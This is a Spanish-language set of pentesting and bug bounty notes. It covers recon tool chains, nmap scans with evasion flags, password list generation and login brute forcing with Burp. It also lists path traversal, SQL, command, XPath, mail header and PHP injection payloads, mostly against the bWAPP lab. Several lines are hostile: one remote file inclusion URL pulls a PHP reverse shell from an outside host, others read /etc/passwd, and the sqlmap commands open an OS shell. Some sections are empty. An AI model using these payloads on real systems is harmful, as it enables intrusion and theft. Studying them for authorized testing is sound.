# Metodologías 
Metodologías explicadas, paso a paso con pruebas y herramientas.  
Son las que probe, me funcionaron, me gustaron.

## Listado de varios métodos
Un listado con links y videos de varias metodologías de Recon.  
https://securib.ee/beelog/the-best-bug-bounty-recon-methodology/  


## zseano's methodology (pdf)
https://www.bugbountyhunter.com/methodology/zseanos-methodology.pdf  


## Diferentes Estrategias/Métodologías de Bug Bounty

**Opción 1**  

amass->httpx->gau->kxss  
https://github.com/OWASP/Amass  
https://github.com/projectdiscovery/httpx  
https://github.com/lc/gau  
https://github.com/tomnomnom/hacks/tree/master/kxss  
https://github.com/Emoe/kxss  

GF Patterns:  
```bash
git clone https://github.com/1ndianl33t/Gf-Patterns
mkdir .gf
mv ~/Gf-Patterns/*.json ~/.gf 
```

Pasos:  
```bash
amass enum -passive -d hilton.com -noalts -o hosts.txt  
#cat hosts.txt | httpx   
httpx -l hosts.txt -silent > httpx.txt
# subfinder -d hackerone.com | httpx -title -tech-detect -status-code -title -follow-redirects
```  

Otro:  
```
gau -subs target.com | kxss
```


---  

**Opción 2**  

https://www.infosecmatter.com/bug-bounty-tips-8-oct-14/#7_simple_reflected_xss_scenario  

Run  
subfinder -d target.com | httprobe -c 100 > target.txt  
Run  
cat target.txt | waybackurls | gf xss | kxss  
Got a URL which had all the special characters unfiltered and the parameter was callback=  


---  

**Opción 3**  

https://twitter.com/nullenc0de/status/1236047455831101446  

Methodology:  
1) Identify bug bounty  
2) Enumerate sub domains (I use amass, subfinder)  
3) Feed those to httpprobe  
4) Feed that list to a crawling tool  (hakcrawler)  
5) Feed that list to kxss  
6) grep output for " (easiest win)  

assetfinder target.com | hakrawler | kxss  


---  

**Opción 4**  

1) Buscar si hay una página de registro y login. Probar registrarse o loguearse, incluyendo probar:  
   1)  XSS
   2)  Probar diferentes vectores de ataques en cualquier input q se prueda probar
2)  Ingresar o registrarse como un usuario normal
    1)  monitorizando todo con Burp suite o similar
    2)  tomar nota , haciendo un mapa mental
3)  Prestar atencion a permisos, diferentes secciones de la aplicación, comunicacion con otras aplicaciones, etc
4)  Revisar si la web tiene un manual, buscarlo con google dorks
5)  Si usas Burp Suite Pro , puede arrojar falsos positivos, por lo cual, todo tiene q ser reproducible y demostrar un impacto.
6)  


--- 

**Opción usando QuickXSS**  
  
https://github.com/theinfosecguy/QuickXSS  
Ejecutar install.sh para instalar dependencias.  
Luego 
```
./QuickXSS.sh -d <target.com>
./QuickXSS.sh -d <target.com> -b <blindxss.xss.ht>
./QuickXSS.sh -d <target.com> -o xss_results.txt 
./QuickXSS.sh -d <target.com> -b <blindxss.xss.ht> -o xss_results.txt
```


--- 

**Pasos de S4vitar para pentesting**   

1)  
2)   


---  

## Curso Become Ethical Hacker in 15 Hours - 2021  

https://www.udemy.com/course/become-ethical-hacker-in-15-hours  

Toma como base la utilización de [Kali Linux](https://www.kali.org/) y el proyecto vulnerable [bWAPP](https://sourceforge.net/projects/bwapp/).  

### Recon  

### Passive Scan  
Harvester  
Recon-NG  
ARP : `arp -a` , `arp -an`  
Wireshark (captura tráfico de la red)  

### Active Scan  
hping : `hping3 --scan '-500 -S ip_or_host`  
nmap : 
```
nmap -n -Pn -sS ip --top-port 10
nmap -n -Pn -sS ip --top-port 10 -sV
nmap -n -sS ip -p443
nmap -n -sS ip -p443 -sV
nmap -n -sS ip --top-port 100 -O 
nmap -n -sS ip --top-port 100 -O  --osscan-guess 
nmap -n -Pn -sS ip --top-port 10 -oX resX.xml   (xml output)
nmap -n -Pn -sS ip --top-port 10 -oG res.gnmap   (grep output)
```

nmap script scanning:  
-sC or --script  
`/usr/share/nmap/scripts`

```
locate *.nse
cd /usr/share/nmap/scripts 
nmap --script-help smb-brute
namp --script telnet-brute
nmap --script "default and safe"

nmap -n -sS ip -p22 -sC 
nmap -n -sS ip -p22 -sC -vvv
nmap -n -sS ip -p22 -sC -vvv
nmap -n -sS ip -p22 -sC ssh-*
nmap ip -p22 -sC ssh-* -sV
```

Useful scripts:  
```
*-brute.nse  
*-info.nse  
dns-recursion  
dns-zone-transfer  
http-slowloris-check  
ms-sql-info  
ms-sql-dump-hashes  
nbstat  
smb-enum-users  
smb-enum-shares  
```

Bypass security in nmap scans:  
```
-f 
--source-ports  
--randomize-hosts
-S
--badsum
```

### Vulnerability Scan y Exploits  
Nessus  
Exploit Databases - https://www.exploit-db.com/  

#### Explotation Framework

[Metasploit](metasploit.md)

### Web Hacking  

- Extraer información del dominio, usar `whois`  

```
whois google.com
```

- Identificar host y subdominios, usando `fierce`, `theharvester`  

```
fierce -dns google.com -threads 10 -file /tmp/info.txt

theharvester -d google.com -b bing -l 500 -f /tmp/info.html
```

- Detectar aplicaciones en el mismo servicio  

Recomienda hacerlo manualmente esta parte.  

- Descubrir puertos y servicios  

Usando nmap.  
Mas arriba en la seccion Active Scan hay varios ejemplos.  

- Analizar tecnología y arquitectura  

Whatweb  
```
whatweb -a 3 http://192.168.204.130/bWAPP/
```

Burp Suite  
```
Interceptar tráfico y mirar la solapa Headers.  
Navegar manualmente la página interceptando con burp.  
Luego mirar la solapa Target - Sitemap.  
```

Dirbuster  
```
dirbuster
``` 

- Google Hacking  

A través de Google se puede obtener mucha información de los objetivos.  

```
site:nytimes.com -site:www.nytimes.com
(site:nytimes.com -site:www.nytimes.com) AND (inurl:login or inurl:singup)
inurl:"phpmyadmin/index.php"
intitle:SQLLiteManager inurl:/sqllite/
```
Mas ejemplos:  
https://www.exploit-db.com/google-hacking-database  


- Listados de contraseñas  

Con crunch se puede generar listados de contraseñas.  

```
crunch
crunch 4 4 aB1.
man crunch
cat /usr/share/crunch/charset.lst
crunch 8 8 -f /usr/share/crunch/charset.lst lalpha
crunch 8 8 "aB1. \,"
crunch 8 8 "aB1. \," -o wordlist
```

- Atacar logins inseguros

```
Abrir Burp Suite,   
Ir a la solapa Intruder,  
Luego a Positions, poner clear, luego seleccionar primero el valor del parametro de usuario y poner Add y luego el de password y tambien poner Add,  
En Attack Type seleccionar Cluster Bomb,
Abrir solapa Payloads, seleccionar el payload 1, y luego Load para cargar la lista de palabras a probar, lo mismo con el payload 2.
Ir a la pestaña Options, en Grep Match poner Clear y escribir el mensaje que muestra por pantalla al fallar el login "Invalid credentials" por ejemplo, y hacer clic en Add,

Start attack.
```

- Path Traversal: Directorio o Archivo 

Esto hace referencia a cuando en una web se incluye un directorio o archivo por parámetro, podemos modificarlo para llegar hasta un directorio de un nivel superior del sistema , como ser /etc/passwd.  
Ejemplo:  
https://domain/xxx/xxx.php?page=xxx   
https://domain/xxx/xxx.php?page=../../../etc/passwd  
https://domain/xxx/xxx.php?page=/etc/passwd  
https://domain/xxx/xxx.php?page=file:///etc/passwd  

```
dotdotpwn -m payload -h ip -p /root/dt.txt -o unix -f /etc/passwd -d 3 -x 80 -b -k "root"
dotdotpwn -m payload -h ip -p /root/dt.txt -o unix -f /etc/passwd -d 3 -x 80 -k "root"
```

- File inclusion

Ejemplo  
```
http://192.168.204.130/bWAPP/rifi.php?language=http://imdb.com&action=go
http://192.168.204.130/bWAPP/rifi.php?language=http://myip/php-reverse-shell.phpaction=go
```

- HTTP Only Cookies  

Sirve para que desde javascript no se pueda leer el valor de las cookies.  

- Secure Cookies  

Detecta que el sitio sea https.  

- XSS  

Ya explicado en varios lugares.  
La vulnerabilidad aplica cuando se inserta codigo JS en una página.  
Ya sea x url , en un form, en redirect, etc.   

- SQL Injection  

Podemos usar errores, union , booleanos, out-of-band , time-delay.  
Ejemplos a usar en inputs:  

```
'#
' order by 10#
' order by 7#
' union select 1,2,3,4,5,6,7#
' union select 1,version(),database(),user(),5,6,7#
' union select 1,load_file('/etc/passwd'),3,4,5,6,7#
4 OR 1=1
4 order by 1
' or 1=1 and sleep(0,10)#
```

Ejemplos para usar modificando el valor de un parametro en un POST  
```
4 or 1=1
0 union select 1,version(), database(), user(),5,6,7
0 union select 1,schema_name,default_character_set_name,default_collation_name, 5,6,7 from information_schema.schemata limit 0,1
0 union select 1,table_name,3,4,5,6,7 from informatin_schema.tables limit 0,1
0 union select 1,group_concat(table_name),3,4,5,6,7 from informatin_schema.tables where table_schema='bWAPP'
0 union select 1,group_concat(column_name),3,4,5,6,7 from informatin_schema.columns where table_schema='bWAPP' and table_name='movies'
null union select * from movies into OUTFILE '/var/www/xxxx/documents/result.txt'
null union select 1,load_file('/var/www/xxxx/documents/result.txt'),3,4,5,6,7 
0 union select 1,group_concat(table_name),3,4,5,6,7 from informatin_schema.tables where table_schema=CHAR(98,87,65,80,80)
```

Completando un form que luego graba los datos  
```
a', (select concat_ws(0x3a,schema_name,default_character_set_name,default_collation_name) from information_schema.schemata limit 0,1))#
a', (select concat_ws(0x3a,schema_name,default_character_set_name,default_collation_name) from information_schema.schemata limit 1,1))#
```

- SQLmap

```
sqlmap -h
sqlmap -hh

sqlmap -u 'url?param=value' -p title --cookie "get_the_cookie_Value_from_browser..." --random-agent -H "PENTEST:31.11.2021"  --dbms MySQL --os Linux -f -b --current-user --current-db --is-dba 
sqlmap -u 'url?param=value' -p title --cookie "get_the_cookie_Value_from_browser..." --random-agent -H "PENTEST:31.11.2021" --users --passwords --privileges --roles
sqlmap -u 'url?param=value' -p title --cookie "get_the_cookie_Value_from_browser..." --random-agent -H "PENTEST:31.11.2021" --dbs --schema
sqlmap -u 'url?param=value' -p title --cookie "get_the_cookie_Value_from_browser..." --random-agent -H "PENTEST:31.11.2021" --sql-shell
sqlmap -u 'url?param=value' -p title --cookie "get_the_cookie_Value_from_browser..." --random-agent -H "PENTEST:31.11.2021" --os-shell
```

- Command injection

Es cuando por ejemplo tenemos un input q pide un nombre de dominio, y ejecuta por detras un comando de sistema como puede ser "ping".  
Entonces se agrega diferentes comandos:   
```
www.google.com & pwd
www.google.com && pwd
www.google.com | pwd
www.google.com ; pwd
www.google.com; pwd
```

También se puede usar la herramienta Commix.  


- XML / Path Injection

Se prueba por ejemplo ingresar comillas simples o dobles en un form, y si muestra un error de XML es una señal.  

Ejemplo de inyecciones:  
```
' or 1=1 or '
' or position()=1 or '
' or position()=2 or '

```


- SMTP Mail Header Injection

Inyección posible en formularios de contacto.  

Probar interceptar trafico con Burp para ver lo que se envía como request.  

Probar agregar en el email del usuario:  
`direcciondelusuario@server.com%0ACc:otradireccion@email.com`  

Templates para hacer email phishing.  
https://github.com/wildbit/postmark-templates  

En Burp , hay una solapa "Decoder" donde se puede copiar el contenido para codificarlo.  


- PHP Code injection  

Por ejemplo vemos q cambiando datos de un parámetro podemos ejecutar código PHP.  

En una url:  
`http://host/dir/prueba.php?message=test`  
por
`http://host/dir/prueba.php?message=test; phpinfo();`  
`http://host/dir/prueba.php?message=test; system("pwd");`  
`http://host/dir/prueba.php?message=test; system("cat /etc/passwd");`  

Si responden, se puede hacer un `which nc` para saber el path de netcat , y ejecutar nc para manejo remoto.  


- HTML Insecure Local Storage  





